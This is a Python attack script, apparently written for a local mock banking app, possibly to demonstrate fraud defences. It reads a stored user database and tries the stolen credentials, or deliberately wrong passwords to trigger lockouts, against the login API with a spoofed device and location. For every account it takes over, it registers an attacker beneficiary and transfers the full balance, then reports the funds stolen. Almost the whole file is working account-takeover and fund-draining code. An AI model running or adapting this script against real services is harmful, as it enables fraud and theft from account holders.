# Attack chain:
# 1. DB Breach             — read users.json directly
# 2. Credential stuffing   — try stolen credentials or repeated bad passwords
# 3. Beneficiary injection — register attacker account
# 4. Large transfer        — drain full balance

import os
import json
import time
import requests
from pathlib import Path

BASE                  = os.environ.get("TARGET", "http://localhost:5000")
DB_PATH               = Path(__file__).parent.parent / "data" / "users.json"
ATTACKER_ACCOUNT      = "ACC-ATTACKER-0000"
ATTACK_DURATION       = int(os.environ.get("ATTACK_DURATION", "30"))
ATTACK_MODE           = os.environ.get("ATTACK_MODE", "credential_stuffing").strip().lower()
ATTEMPTS_PER_ACCOUNT  = int(os.environ.get("ATTEMPTS_PER_ACCOUNT", "5"))
TARGET_USER           = os.environ.get("TARGET_USER", "").strip()
SLEEP_BETWEEN_TRIES   = float(os.environ.get("SLEEP_BETWEEN_TRIES", "0.2"))
WRONG_PASSWORD_SUFFIX = os.environ.get("WRONG_PASSWORD_SUFFIX", "_wrong")

def section(title):
    print()
    print("=" * 55)
    print(f"  {title}")
    print("=" * 55)

def classify_failure(error: str) -> str:
    msg = (error or "").lower()
    if "too many failed attempts" in msg:
        return "temp_locked"
    if "account locked after repeated failures" in msg:
        return "perm_locked"
    if "mfa required" in msg or "verification" in msg:
        return "mfa_blocked"
    if "invalid username or password" in msg:
        return "bad_credentials"
    return "other_failure"

# STEP 1: DB Breach
section("STEP 1 — DB Breach (read users.json)")

if not DB_PATH.exists():
    print("  users.json not found — run run.py first.")
    exit(1)

with open(DB_PATH) as f:
    stolen_db = json.load(f)

if TARGET_USER:
    stolen_db = [u for u in stolen_db if u.get("username") == TARGET_USER]
    if not stolen_db:
        print(f"  target user '{TARGET_USER}' not found.")
        exit(1)

print(f"  users.json obtained — {len(stolen_db)} account(s) selected\n")
for user in stolen_db:
    secret_preview = user.get("password", "<hashed_or_hidden>")
    print(
        f"    username: {user.get('username', ''):30}  "
        f"password: {secret_preview:20}  "
        f"balance: £{float(user.get('balance', 0)):.2f}"
    )

# STEP 2: Credential stuffing
mode_label = (
    "Credential stuffing"
    if ATTACK_MODE == "credential_stuffing"
    else "Repeated invalid login (lockout demo)"
)
section(f"STEP 2 — {mode_label} ({ATTACK_DURATION}s time limit)")

results = {
    "total_accounts": len(stolen_db),
    "attempted_requests": 0,
    "success": 0,
    "failed": 0,
    "mfa_blocked": 0,
    "temp_locked": 0,
    "perm_locked": 0,
    "skipped": 0,
    "compromised": [],
}

start_time = time.time()
print(f"  Attack started — {ATTACK_DURATION}s window")
print(f"  Mode           — {ATTACK_MODE}")
print(f"  Tries/account  — {ATTEMPTS_PER_ACCOUNT}\n")

for user in stolen_db:
    username = user.get("username", "")
    stored_password = user.get("password")
    balance = float(user.get("balance", 0))

    if ATTACK_MODE == "credential_stuffing" and not stored_password:
        print(f"  [skip] {username:30}  no plaintext password available")
        results["skipped"] += 1
        continue

    for attempt_no in range(1, ATTEMPTS_PER_ACCOUNT + 1):
        elapsed = time.time() - start_time
        if elapsed > ATTACK_DURATION:
            remaining_accounts = len(stolen_db) - stolen_db.index(user)
            results["skipped"] += remaining_accounts
            print(f"\n  Time limit reached ({elapsed:.1f}s) — stopping attack")
            break

        if ATTACK_MODE == "lockout_demo":
            password_to_try = (stored_password or username) + WRONG_PASSWORD_SUFFIX
        else:
            password_to_try = stored_password
        results["attempted_requests"] += 1

        try:
            resp = requests.post(
                f"{BASE}/api/login",
                json={
                    "username": username,
                    "password": password_to_try,
                    "device_id": f"ATTACKER-DEVICE-{attempt_no:03d}",
                    "location": "Lagos, NG",
                },
                timeout=5,
            )
            data = resp.json()
        except Exception as e:
            results["failed"] += 1
            print(f"  [{elapsed:5.1f}s]  ✗ error    {username:30}  try={attempt_no}  {e}")
            time.sleep(SLEEP_BETWEEN_TRIES)
            continue

        elapsed = time.time() - start_time

        if data.get("ok") and "session_id" in data:
            results["success"] += 1
            results["compromised"].append({
                "username": username,
                "session_id": data["session_id"],
                "balance": balance,
            })
            print(
                f"  [{elapsed:5.1f}s]  ✓ SUCCESS  {username:30}  "
                f"try={attempt_no}  £{balance:.2f}"
            )
            break

        if data.get("requires_mfa"):
            results["mfa_blocked"] += 1
            print(
                f"  [{elapsed:5.1f}s]  ! MFA      {username:30}  "
                f"try={attempt_no}  blocked by MFA"
            )
            break

        # Attack failure
        error = data.get("error", f"HTTP {resp.status_code}")
        failure_type = classify_failure(error)
        results["failed"] += 1

        if failure_type == "temp_locked":
            results["temp_locked"] += 1
            print(
                f"  [{elapsed:5.1f}s]  ! LOCKED   {username:30}  "
                f"try={attempt_no}  temporary lock"
            )
            break
        elif failure_type == "perm_locked":
            results["perm_locked"] += 1
            print(
                f"  [{elapsed:5.1f}s]  ! PERM     {username:30}  "
                f"try={attempt_no}  permanent lock"
            )
            break
        else:
            print(
                f"  [{elapsed:5.1f}s]  ✗ failed   {username:30}  "
                f"try={attempt_no}  {error}"
            )

        time.sleep(SLEEP_BETWEEN_TRIES)
    else:
        # inner loop completed without break
        pass

    if time.time() - start_time > ATTACK_DURATION:
        break

total_elapsed = time.time() - start_time

print(f"\n  Time elapsed       : {total_elapsed:.1f}s / {ATTACK_DURATION}s")
print(f"  Accounts selected  : {results['total_accounts']}")
print(f"  Requests attempted : {results['attempted_requests']}")
print(f"  Success            : {results['success']}")
print(f"  MFA blocked        : {results['mfa_blocked']}")
print(f"  Temp locked        : {results['temp_locked']}")
print(f"  Perm locked        : {results['perm_locked']}")
print(f"  Failed             : {results['failed']}")
print(f"  Skipped            : {results['skipped']}")

if results["total_accounts"] > 0:
    print(
        f"  Compromise rate    : "
        f"{results['success'] / results['total_accounts'] * 100:.1f}%"
    )

if not results["compromised"]:
    print("\n  No accounts compromised.")
    if ATTACK_MODE == "lockout_demo":
        print("  Lockout demo finished — beneficiary/transfer phase skipped.")
    else:
        print("  Attack aborted before beneficiary injection.")
    print(f"\n  Audit log : {BASE}/audit\n")
    exit(0)

# STEP 3: Beneficiary injection
section("STEP 3 — Beneficiary injection (all compromised accounts)")

for account in results["compromised"]:
    resp = requests.post(
        f"{BASE}/api/beneficiary/add",
        json={
            "session_id": account["session_id"],
            "target_account": ATTACKER_ACCOUNT,
            "nickname": "my savings",
        },
    )
    data = resp.json()
    bene_id = data.get("beneficiary_id")
    account["beneficiary_id"] = bene_id
    status = f"registered  id={bene_id}" if bene_id else "✗ failed"
    print(f"  {account['username']:30}  {status}")

# STEP 4: Drain all accounts
section("STEP 4 — Drain all compromised accounts")

total_stolen = 0.0
for account in results["compromised"]:
    if not account.get("beneficiary_id"):
        continue

    amount = account["balance"]
    resp = requests.post(
        f"{BASE}/api/transfer",
        json={
            "session_id": account["session_id"],
            "beneficiary_id": account["beneficiary_id"],
            "amount": amount,
        },
    )
    data = resp.json()

    if data.get("status") == "COMPLETED":
        total_stolen += amount
        print(
            f"{account['username']:30}  £{amount:.2f} transferred  "
            f"txn={data.get('txn_id', '—')}"
        )
    else:
        print(f"{account['username']:30}  transfer failed")

# SUMMARY
section("ATTACK COMPLETE — Summary")
print()
print(f"  Accounts selected    : {results['total_accounts']}")
print(f"  Requests attempted   : {results['attempted_requests']}")
print(f"  Accounts compromised : {results['success']}")
print(f"  MFA blocked          : {results['mfa_blocked']}")
print(f"  Temp locked          : {results['temp_locked']}")
print(f"  Perm locked          : {results['perm_locked']}")
print(f"  Total funds stolen   : £{total_stolen:.2f}")
print()
print(f"  Audit log : {BASE}/audit")
print()